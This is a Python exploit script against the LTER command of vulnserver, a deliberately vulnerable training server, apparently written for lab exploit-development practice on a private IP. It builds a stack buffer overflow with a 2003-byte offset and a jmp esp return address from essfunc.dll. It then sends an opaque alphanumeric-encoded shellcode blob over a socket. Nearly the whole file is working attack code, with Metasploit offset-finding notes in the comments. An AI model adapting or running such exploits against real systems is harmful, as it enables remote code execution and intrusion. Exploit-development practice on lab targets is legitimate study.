#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from struct import pack
from sys import exit

rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

def validate_payload_len(payload):
    expected_len = 4011
    payload_len = len(payload)
    if payload_len != expected_len:
        print('[!] Payload length was {l}, expected {e}'.format(l=payload_len, e=expected_len))
        exit(1)

# 11 bytes filler
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
# [*] Exact match at offset 2003
# if you use a longer buffer, you get an SEH crash which is much harder to exploit
payload = "LTER /.:/" # 9 bytes
payload += "A" * 2003
# Message=  0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (\\vmware-host\Shared Folders\SharedWithVM\vulnerable-apps\vulnserver\essfunc.dll)
payload += pack("<L", 0x62501205)
payload += "TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIlYxk230ePs0U0oyjEtqYPatnkBp4plKbrflnkaBVtlKqb6H6oMgrj6FTqyoLlWLu1SLfbdlEp9QJofm6a8GXbibbr67LKpRtPLK0JwLNkPL7aRXzCsxs1KaCank3iup7qxSnkqYWhZCDzaYnkfTNkeQIFFQ9oLliQHO4MgqiWVXipCEjVvccMIhgK1mutBUHdChlKf8fDEQHSsVLKflRknkrxUL31ZsNkUTnkGqHPNi3tvDDdCkckPaRyrz3aYom0aOsocjlKdRxkNmQMu8p3ub5P5P1xcGQcWB1O1DU82lrWQ6fgyoju88z05QC0c06IJdRt2pu8Q9k02K5PYokeRpBpv0BpaPbpW0bpqxyzdOYOypKOXUJ7cZ4ESXnLB0NyMUU85R5PdQ1LoyZF0jr00Vv7E8z995D4qqkOyEMUiPCDDLio0NuXt5xl2HxpLuy2V6yozuax1srM54ePMYisf7f71GVQ8vBJfr1IV6JBymu6xG74EtwLUQfanmQTet20kvs0rdSdV0rvQF3fcvPVpNbvSfpSBvu8BY8LGOlFyoZuMYIp2nRvG6IofPU8DHMWWmsPyon5oKL0x5NBSfPhI6z5OMOmkOyE5lwvcLGzmPikYpcEtEMkqWb3sBbOqz5PpS9oxUAA"
payload += "D" * (3000 - len(payload) + 9)
payload += "\r\n" # 2 bytes

if __name__ == '__main__':
    print('[*] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    s.connect(target)
    print('[*] receving welcome message')
    msg = s.recv(1024)
    print('[*] received welcome message:\n\t{msg}'.format(msg=msg.rstrip()))
    print('[*] sending payload')
    s.send(payload)
    s.close()
    print('[*] B00M!')
